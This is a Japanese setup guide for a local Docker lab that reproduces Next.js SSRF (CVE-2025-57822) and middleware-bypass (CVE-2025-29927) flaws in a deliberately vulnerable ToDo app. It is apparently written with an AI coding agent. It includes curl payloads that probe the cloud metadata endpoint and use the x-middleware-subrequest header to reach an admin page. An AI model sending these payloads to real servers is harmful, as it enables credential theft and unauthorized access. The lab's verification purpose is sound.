# Next.js 14.1.1 脆弱性検証 - セットアップガイド

このガイドでは、CVE-2025-57822 (SSRF) と CVE-2025-29927 (ミドルウェアバイパス) の両方を検証するための環境セットアップ手順を説明します。

## 前提条件

- Docker と Docker Compose がインストールされていること
- ポート3000が利用可能であること
- curlコマンドが使用可能であること

## セットアップ手順

### 1. リポジトリの確認

```bash
cd /Users/azkineri/Documents/Workspace/ssrfTest
```

### 2. Dockerコンテナのビルドと起動

```bash
# 既存のコンテナを停止（実行中の場合）
docker compose down

# 本番モードでビルド＆起動
docker compose up --build
```

> [!IMPORTANT]
> 両方の脆弱性を検証するには、本番ビルド（`Dockerfile`）で起動する必要があります。

### 3. データベースのマイグレーション

コンテナが起動したら、別のターミナルで以下を実行:

```bash
# Prismaマイグレーションを実行（isAdminフィールドを追加）
docker compose exec web-app bunx prisma migrate deploy

# Prismaクライアントを再生成
docker compose exec web-app bunx prisma generate
```

### 4. アプリケーションの再起動

マイグレーション後、コンテナを再起動:

```bash
docker compose restart web-app
```

### 5. アカウントの作成

1. ブラウザで http://localhost:3000 を開く
2. 新規アカウントを作成してログイン
3. ToDoアプリが正常に動作することを確認

### 6. 管理者アカウントの作成（CVE-2025-29927用）

CVE-2025-29927を検証するには、管理者アカウントが必要です:

```bash
# コンテナ内のシェルに入る
docker compose exec web-app sh

# SQLiteデータベースを開く
sqlite3 /app/dev.db

# ユーザー一覧を確認
SELECT id, email, isAdmin FROM user;

# 特定のユーザーを管理者にする（メールアドレスを置き換える）
UPDATE user SET isAdmin = 1 WHERE email = 'your-email@example.com';

# 確認
SELECT id, email, isAdmin FROM user;

# 終了
.quit
exit
```

## 検証の開始

セットアップが完了したら、以下のガイドに従って各CVEを検証できます:

### CVE-2025-57822: SSRF脆弱性

**検証ガイド**: [CVE-2025-57822-verification.md](file:///Users/azkineri/.gemini/antigravity/brain/544e050b-18e6-4621-ae73-0e86f1c4c5cc/CVE-2025-57822-verification.md)

**クイックテスト**:
```bash
# セッションCookieを取得後、以下を実行
curl -v \
  -H "Location: http://169.254.169.254/latest/meta-data/" \
  -H "Cookie: better-auth.session_token=<your-token>" \
  http://localhost:3000/
```

### CVE-2025-29927: ミドルウェアバイパス

**検証ガイド**: [CVE-2025-29927-verification.md](file:///Users/azkineri/.gemini/antigravity/brain/544e050b-18e6-4621-ae73-0e86f1c4c5cc/CVE-2025-29927-verification.md)

**クイックテスト**:
```bash
# 非管理者のセッションCookieを取得後、以下を実行
curl -v \
  -H "x-middleware-subrequest: 1" \
  -H "Cookie: better-auth.session_token=<non-admin-token>" \
  http://localhost:3000/admin
```

## トラブルシューティング

### コンテナが起動しない

```bash
# ログを確認
docker compose logs web-app

# ボリュームを含めて完全に削除して再ビルド
docker compose down -v
docker compose up --build
```

### マイグレーションエラー

```bash
# Prismaのリセット（データが消えます）
docker compose exec web-app bunx prisma migrate reset

# または、手動でマイグレーションを適用
docker compose exec web-app bunx prisma migrate dev --name add_is_admin
```

### isAdminフィールドが見つからない

```bash
# Prismaクライアントを再生成
docker compose exec web-app bunx prisma generate

# コンテナを再起動
docker compose restart web-app
```

### TypeScriptエラーが表示される

Prismaクライアントの再生成後、TypeScriptの型定義が更新されます。コンテナを再起動すれば解決します。

## 次のステップ

1. **CVE-2025-57822の検証**: [詳細ガイド](file:///Users/azkineri/.gemini/antigravity/brain/544e050b-18e6-4621-ae73-0e86f1c4c5cc/CVE-2025-57822-verification.md)を参照
2. **CVE-2025-29927の検証**: [詳細ガイド](file:///Users/azkineri/.gemini/antigravity/brain/544e050b-18e6-4621-ae73-0e86f1c4c5cc/CVE-2025-29927-verification.md)を参照

## 実装されたファイル

- [middleware.ts](file:///Users/azkineri/Documents/Workspace/ssrfTest/middleware.ts) - 両方のCVEを含む脆弱なミドルウェア
- [app/admin/page.tsx](file:///Users/azkineri/Documents/Workspace/ssrfTest/app/admin/page.tsx) - 管理者専用ページ
- [prisma/schema.prisma](file:///Users/azkineri/Documents/Workspace/ssrfTest/prisma/schema.prisma) - isAdminフィールドを含むスキーマ
- [Readme.md](file:///Users/azkineri/Documents/Workspace/ssrfTest/Readme.md) - プロジェクト概要
